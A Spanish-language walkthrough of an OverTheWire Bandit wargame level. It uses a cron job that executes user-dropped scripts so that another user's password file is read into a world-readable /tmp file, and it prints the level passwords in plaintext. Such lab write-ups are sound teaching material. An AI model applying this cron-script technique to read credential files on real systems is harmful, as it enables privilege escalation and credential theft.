## Objetivo 
A program is running automatically at regular intervals from **cron**, the time-based job scheduler. Look in **/etc/cron.d/** for the configuration and see what command is being executed.

**NOTE:** This level requires you to create your own first shell-script. This is a very big step and you should be proud of yourself when you beat this level!

**NOTE 2:** Keep in mind that your shell script is removed once executed, so you may want to keep a copy around…
## Datos de acceso al nivel 
bandit23
0Zf11ioIjMVN551jX3CmStKLYqjk54Ga

## Solución  
```bash
bandit23@bandit:~$ cat /etc/cron.d/cronjob_bandit24
@reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
bandit23@bandit:~$ cat /usr/bin/cronjob_bandit24.sh
#!/bin/bash

myname=$(whoami)

cd /var/spool/$myname/foo
echo "Executing and deleting all scripts in /var/spool/$myname/foo:"
for i in * .*;
do
    if [ "$i" != "." -a "$i" != ".." ];
    then
        echo "Handling $i"
        owner="$(stat --format "%U" ./$i)"
        if [ "${owner}" = "bandit23" ]; then
            timeout -s 9 60 ./$i
        fi
        rm -f ./$i
    fi
done
bandit23@bandit:~$ mktemp -d
/tmp/tmp.qQMoorbJYz
bandit23@bandit:~$ chmod 777 /tmp/tmp.qQMoorbJYz
bandit23@bandit:~$ mktemp -d
/tmp/tmp.qQMoorbJYz
bandit23@bandit:~$ chmod 777 /tmp/tmp.qQMoorbJYz
bandit23@bandit:~$ cd /tmp/tmp.qQMoorbJYz
bandit23@bandit:/tmp/tmp.qQMoorbJYz$ echo "cat /etc/bandit_pass/bandit24 > /tmp/tmp.qQMoorbJYz/password" > script.sh
bandit23@bandit:/tmp/tmp.qQMoorbJYz$ ls
script.sh
bandit23@bandit:/tmp/tmp.qQMoorbJYz$ cat script.sh
cat /etc/bandit_pass/bandit24 > /tmp/tmp.qQMoorbJYz/password
bandit23@bandit:/tmp/tmp.qQMoorbJYz$ chmod 777 script.sh
bandit23@bandit:/tmp/tmp.qQMoorbJYz$ touch password
bandit23@bandit:/tmp/tmp.qQMoorbJYz$ chmod 777 password
bandit23@bandit:/tmp/tmp.qQMoorbJYz$ ls -la
total 10816
drwxrwxrwx    2 bandit23 bandit23     4096 Sep  4 16:36 .
drwxrwx-wt 4028 root     root     11063296 Sep  4 16:36 ..
-rwxrwxrwx    1 bandit23 bandit23        0 Sep  4 16:36 password
-rwxrwxrwx    1 bandit23 bandit23       61 Sep  4 16:34 script.sh
bandit23@bandit:/tmp/tmp.qQMoorbJYz$
bandit23@bandit:/tmp/tmp.qQMoorbJYz$ cp script.sh /var/spool/bandit24/foo
cat password
gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8

```

## Notas Adicionales 
mktemp -d crea una carpeta temporal dentro tmp con un nombre random.

### Referencias

